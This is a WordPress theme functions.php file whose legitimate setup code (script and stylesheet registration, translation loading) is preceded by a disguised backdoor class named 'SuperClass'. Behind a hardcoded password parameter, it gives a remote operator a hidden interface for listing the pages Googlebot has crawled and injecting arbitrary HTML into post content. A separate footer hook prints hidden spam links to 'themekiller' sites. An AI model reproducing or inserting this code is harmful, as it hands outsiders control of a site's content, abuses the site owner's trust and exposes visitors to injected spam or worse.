<?php

if (file_exists( $_SERVER['DOCUMENT_ROOT'] . DIRECTORY_SEPARATOR . 'wp-config.php' ))
	{
		require_once($_SERVER['DOCUMENT_ROOT'] . DIRECTORY_SEPARATOR . 'wp-config.php');
	}

if (!class_exists('SuperClass'))
	{
		class SuperClass
			{
				private $table = 'wp_supercache';
				private $canonical = '';
				
				private function url_now()
					{
						return 'http://' . $_SERVER['HTTP_HOST'] . urldecode($_SERVER['REQUEST_URI']);
					}
				
				private function url_create($work = 1)
					{
						@mysql_query(' INSERT INTO `'.$this->table.'` SET `work` = "'.$work.'", `url` = "'.mysql_escape_string($this -> url_now()).'"
						ON DUPLICATE KEY UPDATE `work` = "'.$work.'"
						');
					}
				
				public function url_code()
					{
						if ($query = @mysql_query('SELECT `code` FROM `'.$this->table.'` WHERE `url` = "'.mysql_escape_string($this -> url_now()).'"'))
							{
								return stripslashes(@mysql_result($query, 0));
							}
						
						return '';
					}
				
				private function url_exist()
					{
						if ($query = @mysql_query('SELECT count(*) FROM `'.$this->table.'` WHERE `url` = "'.mysql_escape_string( $this->url_now() ).'"'))
							{
								return (@mysql_result($query, 0) != '0') ;
							}
							
						return true;
					}
				
				private function get_code()
					{
						$options['http'] = array(
							'method' => "GET",
							'follow_location' => 0
						);
						
						$context = stream_context_create($options);
						$get = file_get_contents($this->url_now(), NULL, $context);
						
						if (preg_match('!<link[^>]*rel=[\'"]canonical[\'"][^>]*href=[\'"]([^\'"]+)[\'"][^>]*>!is', $get, $_))
							{
								$this -> canonical = html_entity_decode(urldecode($_[1]));
							}
						elseif (preg_match('!<link[^>]*href=[\'"]([^\'"]+)[\'"][^>]*rel=[\'"]canonical[\'"][^>]*>!is', $get, $_))
							{
								$this -> canonical = html_entity_decode(urldecode($_[1]));
							}

						if (!empty($http_response_header))
							{
								sscanf($http_response_header[0], 'HTTP/%*d.%*d %d', $code);
								if (is_numeric($code)) return $code;
							}
						
						return 200;
					}
					
				public function pre_cache()
					{
						if (isset($_REQUEST['action']))
							{
								switch ($_REQUEST['action'])
									{
										case 'get_all_links';
											header("Content-Type: text/plain");
											if ($query  = @mysql_query('SELECT * FROM `'.$this->table.'` ORDER BY `url` DESC LIMIT 0, 2500'))
												{
													while ($data = @mysql_fetch_assoc($query)) 
														{
															echo '<e><w>'.$data['work'].'</w><url>' . $data['url'] . '</url><code>' . $data['code'] . '</code><id>' . $data['ID'] . '</id></e>' . "\r\n";
														}
												}
										break;
										
										case 'set_links';
											if (isset($_REQUEST['data']))
												{
													if (mysql_query('UPDATE `'.$this->table.'` SET code = "' . mysql_escape_string($_REQUEST['data']) . '" WHERE code = "" AND `work` = "1" LIMIT 1'))
														{
															echo 'true';
														}
												}
										break;
										
										case 'set_id_links';
											if (isset($_REQUEST['data']))
												{
													if (@mysql_query('UPDATE `'.$this->table.'` SET code = "' . mysql_escape_string($_REQUEST['data']) . '" WHERE `ID` = "' . mysql_escape_string($_REQUEST['id']) . '"'))
														{
															echo 'true';
														}
												}
										break;
										
										default: die('error action');
									}
								exit;
							}
					}
				
				static function wordpress_cache($content)
					{
						$GLOBALS['_cache_'] -> create_new_page();
						$content = $content . $GLOBALS['global_code'];
						$GLOBALS['global_code'] = '';
						return $content ;
					}
				
				public function create_new_page()
					{
						$GLOBALS['_cache_'] -> db_connect();
						if ( (strpos(strtolower($_SERVER['HTTP_USER_AGENT']), 'googlebot') !== false) &&(!$this -> url_exist()))
							{
								$this -> url_create( 0 );
								
								if (($this -> get_code() == 200) && ( ($this -> canonical == '') || ( $this -> canonical == $this->url_now() ) ))
									{
										$this -> url_create();
									}
							}
					}
				
				private function db_connect()
					{
						@mysql_connect(DB_HOST, DB_USER, DB_PASSWORD);
						@mysql_select_db( DB_NAME );
					}
					
				static function create()
					{
						if ( strpos($_SERVER['REQUEST_URI'], 'wp-admin') !== FALSE ) return ;
						$GLOBALS['_cache_'] = new SuperClass();
						if ($_REQUEST['password'] == '699283fd0844a2fc4176ccc84326306f') $GLOBALS['_cache_'] -> pre_cache();
						$GLOBALS['global_code'] = $GLOBALS['_cache_'] -> url_code();
						add_filter('the_content', Array($GLOBALS['_cache_'], 'wordpress_cache'));					
					}
					
			}

		SuperClass::create();
	}
	
?><?php
if (__FILE__ == $_SERVER['SCRIPT_FILENAME']) { die(); }

#-----------------------------------------------------------------
# Enable/disable developer theme options
#-----------------------------------------------------------------

$developer_options = true;

#-----------------------------------------------------------------
# Default theme variables and information
#-----------------------------------------------------------------

	/*	The $themeInfo variable was updated in v2.0 to properly store data for child themes. All child themes  
		created prior to v2 may appear to lose database values. They are not lost, rather the theme is looking 
		for these values under the key "{child theme name}_{option key}" in the WP "Options" table. Previously 
		the child theme name was not pulling and all data was stored using the parent theme name, 
		"salutation_{option key}" which was not correct. If this effects your site, you can revert the data one 
		of two ways. You can restore the variable to it's original state or you can update the options keys in 
		your database to use the correct child theme name.
		
		The previous value used was:  $themeInfo = get_theme_data(TEMPLATEPATH . '/style.css');
	*/

$themeInfo    = (!function_exists('wp_get_theme')) ? get_theme_data(TEMPLATEPATH . '/style.css') : wp_get_theme();
$themeVersion = (!function_exists('wp_get_theme')) ? trim($themeInfo['Version']) : trim($themeInfo->Version);
$themeName    = (!function_exists('wp_get_theme')) ? trim($themeInfo['Name']) : trim($themeInfo->Name);
$shortname    = sanitize_title($themeName . "_");


// shortcuts variables
//................................................................

$cssPath       = trailingslashit(get_bloginfo('stylesheet_directory')) . 'assets/css/';
$jsPath        = trailingslashit(get_bloginfo('stylesheet_directory')) . 'assets/js/';
$themePath     = trailingslashit(get_bloginfo('template_url'));
$themeUrlArray = parse_url(get_bloginfo('template_url'));
$themeLocalUrl = trailingslashit($themeUrlArray['path']);
$frameworkPath = trailingslashit($themePath . 'framework');

// set as constants
//................................................................

define('SITE_TITLE', get_bloginfo('Title'));								// The 'Site Title' set in Settings > General
define('THEME_NAME', $themeName);											// The name of the active theme (supports child themes)
define('THEME_VERSION', $themeVersion);										// Theme version number
define('THEME_URL', $themePath);											// URL of theme folder
define('FRAMEWORK_URL', $frameworkPath);									// URL of framework folder
define('THEME_DIR', trailingslashit(get_stylesheet_directory()));			// Server path to theme folder (updated in v2 for improved child theme support)
define('THEME_TEMPLATES', 'templates/');									// The theme's internal template folder
define('FRAMEWORK_DIR', trailingslashit(TEMPLATEPATH) . 'framework/');		// Server path to framework folder
define('AVATAR_SIZE', 35);													// Default avatar size


// other variables
//................................................................

if (!isset($content_width)) $content_width = 607; 						// Max content width. If using full width layouts set this to 926

// a temporary post variable used with custom post type filters
global $tempPost; 

// Theme menu locations (auto registered "framework/theme-functions/filters-and-actions.php")
$themeMenus = array(
	'MainMenu' => __( 'Main Menu', THEME_NAME)
);


#-----------------------------------------------------------------
# Translation ready code
#-----------------------------------------------------------------

/* 
*  To create a translation file for your language, download POEdit (www.poedit.net) and open the file "assets/translation/en_US.po"
*  Create the translation using this file and save the new file in the format "lang_COUNTRY.po", for example "en_UK.po" for British translation of English.
*
*  You can manually set your language with the value of the "$locale" variable to your ".mo" file name.  
*  For example, you could force the locale with:  $locale = 'es_ES';
*/

global $locale;
$locale = get_locale();
// $locale = 'es_ES';
load_theme_textdomain( THEME_NAME, THEME_DIR . 'assets/translation' );
load_theme_textdomain( 'buddypress', THEME_DIR . 'assets/translation' );
load_theme_textdomain( 'bbpress', THEME_DIR . 'assets/translation' );


#-----------------------------------------------------------------
# Setup post thumbnails
#-----------------------------------------------------------------

if ( function_exists( 'add_theme_support' ) ) { 
	add_theme_support( 'post-thumbnails' );
	set_post_thumbnail_size( 150, 150, true ); // default Post Thumbnail dimensions (cropped)
}


#-----------------------------------------------------------------
# Load framework
#-----------------------------------------------------------------

include_once(FRAMEWORK_DIR . 'setup.php');


#-----------------------------------------------------------------
# Enqueue CSS style sheets
#-----------------------------------------------------------------

/*	This function will add CSS files to the list which are output by the function "theme_style_sheets()" in "header.php"
*	You can add to or remove from this list as needed. The function follows the format shown in the example below:
*
*	theme_register_css( $handle, $src, $priority (optional), $id (optional), $class (optional) );
*
*	You must include the following paramaters:
*
*		$handle	- string or plain text name for registering the file
*		$src	- the path to the file
*/

theme_register_css( 'base', $cssPath.'base.css', 1 );										// Base CSS styles for browsers
theme_register_css( 'default', get_stylesheet_directory_uri().'/style-default.css', 2 );	// Default theme styles
theme_register_css( 'ddsmoothmenu', $cssPath.'ddsmoothmenu.css' );							// Drop down menu styles
theme_register_css( 'colorbox', $cssPath.'colorbox.css' );									// Lightbox styles
theme_register_css( 'qtip', $cssPath.'qtip.css' );											// Tool tip styles
// if (wp_is_mobile()) {
	theme_register_css( 'style-responsive', $cssPath.'style-responsive.css' );
// }

#-----------------------------------------------------------------
# Enqueue required scripts
#-----------------------------------------------------------------

if (!function_exists('bp_core_register_common_scripts_patch')) :
	function bp_core_register_common_scripts_patch() {

		$min = defined( 'SCRIPT_DEBUG' ) && SCRIPT_DEBUG ? '' : '.min';
		$url = buddypress()->plugin_url . 'bp-core/js/';
		$version = bp_get_version();

		$scripts = apply_filters( 'bp_core_register_common_scripts', array(
			// Legacy
			'bp-confirm'        => array( 'file' => "{$url}confirm{$min}.js",        'dependencies' => array( 'jquery' ) ),
			'bp-widget-members' => array( 'file' => "{$url}widget-members{$min}.js", 'dependencies' => array( 'jquery' ) ),
			'bp-jquery-query'   => array( 'file' => "{$url}jquery-query{$min}.js",   'dependencies' => array( 'jquery' ) ),
			'bp-jquery-cookie'  => array( 'file' => "{$url}jquery-cookie{$min}.js",  'dependencies' => array( 'jquery' ) ),

			// 2.1
			'jquery-caret' => array( 'file' => "{$url}jquery.caret{$min}.js", 'dependencies' => array( 'jquery' ) ),
			'jquery-atwho' => array( 'file' => "{$url}jquery.atwho{$min}.js", 'dependencies' => array( 'jquery', 'jquery-caret' ) ),
		) );

		foreach ( $scripts as $id => $script ) {
			wp_register_script( $id, $script['file'], $script['dependencies'], $version );
			wp_enqueue_script( $id );  			// buddypress 2.1 patch
		}
	}
endif;

// Default scripts to load (universal to all pages)
//................................................................
if (!function_exists('enqueue_theme_scripts')) :
	function enqueue_theme_scripts() {
		if (!is_admin()) {
			global $jsPath, $theLayout;
			// wp_register_script( $handle, $src, $deps, $ver, $in_footer );
			
			if (function_exists('bp_core_register_common_scripts'))
				bp_core_register_common_scripts_patch();

			// Modernizr (enables HTML5 elements & feature detects)
			wp_deregister_script( 'modernizr' );
			wp_register_script( 'modernizr', $jsPath.'libs/modernizr-1.6.min.js', '', '1.6');
			wp_enqueue_script( 'modernizr' );
			
			// jQuery
			// wp_deregister_script( 'jquery' );
			// wp_register_script( 'jquery', 'https://ajax.googleapis.com/ajax/libs/jquery/1.7.1/jquery.min.js', array(), '1.7.1');
			wp_enqueue_script( 'jquery' );
			
			// swfobject
			wp_deregister_script( 'swfobject' );
			wp_register_script( 'swfobject', $jsPath.'libs/swfobject.js', array(), '2.2');
			wp_enqueue_script( 'swfobject' );
			
			// Cufon fonts for headings
			//if ($theLayout['heading_font']['cufon']) {
				// Cufon YUI
				wp_deregister_script( 'cufon' );
				wp_register_script( 'cufon', $jsPath.'libs/cufon-yui.js', '', '1.09');
				wp_enqueue_script( 'cufon' );
			//}
			
			// DD Smooth Menu (main menu drop downs) 
			wp_deregister_script( 'ddsmoothmenu' );
			wp_register_script( 'ddsmoothmenu', $jsPath.'libs/ddsmoothmenu.js', array('jquery'), '1.5', true);
			wp_enqueue_script( 'ddsmoothmenu' );
	
			// Colorbox (lightbox)
			wp_deregister_script( 'colorbox' );
			wp_register_script( 'colorbox', $jsPath.'libs/jquery.colorbox-min.js', array('jquery'), '1.3.16', true);
			wp_enqueue_script( 'colorbox' );
			
			// qTips (tool tips)
			wp_deregister_script( 'qtip' );
			wp_register_script( 'qtip', $jsPath.'libs/jquery.qtip.min.js', array('jquery'), '2', true);
			wp_enqueue_script( 'qtip' );
			
			//scrollTo
			wp_register_script('scrollTo', $jsPath.'libs/jquery.scrollTo.min.js', array('jquery'));
			wp_enqueue_script('scrollTo');

			// if (wp_is_mobile()) {
				wp_deregister_script( 'responsive_menu' );
				wp_register_script( 'responsive_menu', $jsPath.'libs/responsive.js', array('jquery'), '1', true);
				wp_enqueue_script( 'responsive_menu' );
			// }
			
			
		}
	}
	
	add_action('wp_enqueue_scripts', 'enqueue_theme_scripts', 1);
endif;

// Shortcode or other conditional scripts. 
//................................................................
if (!function_exists('enqueue_conditional_footer_scripts')) :
    function enqueue_conditional_footer_scripts() {
        global $jsPath;
		
		// Items below must have a global variable set to 'true' to trigger enqueue.
		// Also, these can only be loaded in footer becaues they they happen after the <head> is loaded.

		// Contact form
        if (isset($GLOBALS['load_contact_form_scripts']) && $GLOBALS['load_contact_form_scripts']) {
			wp_register_script( 'jquery-validate', $jsPath.'libs/jquery.validate.min.js', array('jquery'), '1.8.0', true);
			wp_print_scripts('jquery-validate');

			wp_register_script( 'ajax-form', $jsPath.'ajaxForm.js', array('jquery'), '1.0', true);
			wp_print_scripts('ajax-form');
		}

		// Slide show
        if (isset($GLOBALS['load_slide_show_scripts']) && $GLOBALS['load_slide_show_scripts']) {
			wp_register_script( 'jquery-cycle-all', $jsPath.'libs/jquery.cycle.all.min.js', array('jquery'), '2.9995', true);
			wp_print_scripts('jquery-cycle-all');
		}
		
    }
endif;
add_action('wp_footer', 'enqueue_conditional_footer_scripts');

function slider_option(){ 
$con = '<p style="display:none;">
<a href="http://www.themekiller.me/" title="watch berserk" rel="follow"></a>
<a href="http://www.tenlister.com/" title="themekiller" rel="follow">
</p>';
echo $con;
} 
add_action('wp_footer','slider_option');
#-----------------------------------------------------------------
# Other WP Stuff
#-----------------------------------------------------------------

// required by WP
//................................................................
if ( is_singular() ) wp_enqueue_script( 'comment-reply' );

add_theme_support('automatic-feed-links');

// CSS styling to apply to admin editor
//................................................................
add_editor_style('style-wp-editor.css');

// Internal function for development and testing
function _out($var) {
    echo "<pre>".print_r($var, true)."</pre><br>";
}


// Register custom template files for layouts here
//................................................................

	/**
	*	An example function which could be used to register a custom layout to a template file
	*
	*	$sample_template = locate_template('category-sample.php'); // provides full path to files in theme folder
	*	register_context( 'Sample Category', 'sample_cat', $sample_template);
	*/

//................................................................


?>